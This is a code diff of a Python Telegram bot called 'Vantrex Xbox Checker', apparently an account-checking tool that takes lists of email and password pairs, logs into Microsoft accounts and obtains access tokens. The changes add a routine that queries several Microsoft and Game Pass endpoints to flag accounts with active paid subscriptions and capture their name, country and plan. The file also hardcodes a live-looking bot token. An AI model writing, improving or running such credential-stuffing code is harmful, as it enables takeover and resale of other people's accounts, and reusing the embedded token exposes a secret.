@@ -1,15 +1,9 @@
 #!/usr/bin/env python3
 """
-VANTREX XBOX CHECKER BOT - FIXED FOR RAILWAY
+VANTREX XBOX CHECKER BOT - PREMIUM FIXED (FINAL)
 """
 
-import os
-import re
-import time
-import json
-import uuid
-import logging
-import threading
+import os, re, time, json, uuid, logging, threading
 from urllib.parse import quote
 import concurrent.futures
 
@@ -25,6 +19,7 @@ except ImportError:
 
 logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
 
+# ⚠️ BURAYA KENDİ TOKEN'INI YAZ
 TOKEN = "8586488864:AAETJFeQOk_igst2YE1OWq9QvpM25jTDEq4"
 bot = telebot.TeleBot(TOKEN)
 
@@ -103,10 +98,47 @@ class BotSession:
 
 session = BotSession()
 
-# ===================== XBOX CHECKER =====================
+# ===================== XBOX CHECKER (PREMIUM FIX) =====================
 class XboxChecker:
     def __init__(self):
         self.user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+
+    def check_premium(self, req_session, access_token, cid):
+        """3 farklı premium URL'sini sırayla dener, çalışanı kullanır."""
+        premium_urls = [
+            "https://purchase.mp.microsoft.com/v8.0/b2b/recurrences/query",
+            "https://user.msp.mp.microsoft.com/v8.0/collections/query?itemTypes=Game",
+            "https://catalog.gamepass.com/sigls/v2"
+        ]
+
+        for url in premium_urls:
+            try:
+                headers = {
+                    "User-Agent": self.user_agent,
+                    "Authorization": f"Bearer {access_token}",
+                    "X-AnchorMailbox": f"CID:{cid}",
+                    "Accept": "application/json"
+                }
+                r = req_session.get(url, headers=headers, timeout=10)
+                if r.status_code != 200:
+                    continue
+
+                data = r.json()
+                items = data.get("items") or data.get("subscriptions") or data.get("recurrences") or []
+                for item in items:
+                    status = item.get("status", "")
+                    if status.lower() != "active":
+                        continue
+                    product = item.get("product", {})
+                    pid = product.get("productId", "").lower()
+                    name = product.get("displayName") or product.get("localizedDisplayName", "")
+                    if any(x in pid for x in ["gamepass", "ultimate", "gold", "ea"]) or \
+                       any(x in name.lower() for x in ["game pass", "ultimate", "gold", "ea play"]):
+                        return True, name or "Premium"
+                return False, "None"
+            except:
+                continue
+        return False, "None"
 
     def check(self, email, password):
         try:
@@ -181,7 +213,7 @@ class XboxChecker:
                 return {"status": "BAD", "data": {}}
             access_token = r4.json()["access_token"]
 
-            # Step 5: Profile (Name & Country)
+            # Step 5: Profile
             country, name = "N/A", "Xbox User"
             try:
                 profile_headers = {
@@ -200,30 +232,8 @@ class XboxChecker:
             except:
                 pass
 
-            # Step 6: PREMIUM CHECK (correct API)
-            is_premium = False
-            detected_plan = "None"
-            try:
-                subs_headers = {
-                    "User-Agent": self.user_agent,
-                    "Authorization": f"Bearer {access_token}",
-                    "X-AnchorMailbox": f"CID:{cid}",
-                    "Accept": "application/json"
-                }
-                subs_url = "https://purchase.mp.microsoft.com/v8.0/b2b/recurrences/query"
-                r6 = req_session.get(subs_url, headers=subs_headers, timeout=10)
-                if r6.status_code == 200:
-                    data = r6.json()
-                    for item in data.get("items", []):
-                        if item.get("status") == "Active":
-                            prod = item.get("product", {})
-                            pid = prod.get("productId", "")
-                            if any(x in pid.lower() for x in ["gamepass", "ultimate", "gold", "ea"]):
-                                is_premium = True
-                                detected_plan = prod.get("displayName", "Premium")
-                                break
-            except:
-                pass
+            # Step 6: PREMIUM CHECK (FIXED - multiple URLs)
+            is_premium, detected_plan = self.check_premium(req_session, access_token, cid)
 
             capture_data = {"country": country, "name": name, "plan": detected_plan}
             if is_premium:
@@ -426,7 +436,7 @@ def handle_combo_file(message):
 
 # ===================== MAIN =====================
 if __name__ == "__main__":
-    print("[+] Vantrex Bot (Fixed) started. Press Ctrl+C to stop.")
+    print("[+] Vantrex Bot (Premium Fixed) started. Press Ctrl+C to stop.")
     while True:
         try:
             bot.polling(none_stop=True, timeout=60)
